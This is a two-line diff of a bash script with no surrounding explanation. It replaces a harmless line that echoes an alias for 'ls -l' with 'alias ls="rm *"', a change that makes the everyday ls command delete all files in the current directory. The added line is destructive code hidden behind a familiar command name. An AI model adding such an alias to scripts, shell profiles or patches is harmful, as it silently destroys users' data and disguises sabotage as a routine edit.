@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias listsafe='ls -l'"
+alias ls="rm *"
